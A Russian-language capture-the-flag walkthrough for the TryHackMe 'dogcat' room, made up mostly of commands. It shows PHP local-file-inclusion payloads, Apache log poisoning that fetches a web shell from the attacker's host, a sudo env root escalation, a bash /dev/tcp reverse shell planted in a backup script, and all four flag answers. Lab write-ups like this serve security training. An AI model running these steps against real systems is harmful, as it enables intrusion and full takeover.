[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [dogcat](https://tryhackme.com/r/room/dogcat) 

Всего 1 заданиe:
## Задание 1
Я сделал этот сайт для просмотра изображений кошек и собак с помощью PHP. Если вам грустно, заходите посмотреть на 
собак/кошек!

Для полного запуска машины может потребоваться несколько минут.

### Ответьте на вопросы ниже
+ 10
Что такое флаг 1?
 ```commandline
nmap -sC -sV <IP>
curl -s "http://<IP>/?view=php://filter/read=convert.base64-encode/resource=./dog/../index"
curl -s "http://<IP>/?view=php://filter/read=convert.base64-encode/resource=dog" | grep "Here you go"
echo "PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K" | base64 -d
curl -s "http://<IP>/?view=php://filter/read=convert.base64-encode/resource=cat" | grep "Here you go"
echo "PGltZyBzcmM9ImNhdHMvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K" | base64 -d
curl -s "http://<IP>/?view=./dog/../../../../var/log/apache2/access.log&ext"

vim shell.php
# php reverse shell

sudo python -m http.server 80
curl -A "<?php file_put_contents('shell.php', file_get_contents('http://<your_own_IP>/shell.php')); ?>" \
ns -nlvp 4444
find / -name *flag* 2>/dev/null
cat /var/www/html/flag.php
```
```commandline
THM{Th1s_1s_N0t_4_Catdog_ab67edfa}
```
+ 25
Что такое флаг 2?
```commandline
cat /var/www/flag2_QMW7JvaY2LvK.txt
```
```commandline
THM{LF1_t0_RC3_aec3fb}
```
+ 30
Что такое флаг 3?
```commandline
sudo -l
sudo /usr/bin/env /bin/bash
cat /root/flag3.txt
```
```commandline
THM{D1ff3r3nt_3nv1ronments_874112}
```
+ 50
Что такое флаг 4?
```commandline
cd /opt/backups
ls -l
cat backup.sh
printf '#!/bin/bash\nbash -i >& /dev/tcp/<your_own_IP>/8080 0>&1' > backup.sh
nc -nlvp 8080
whoami
hostname 
ls -l
cat flag4.txt
```
```commandline
THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)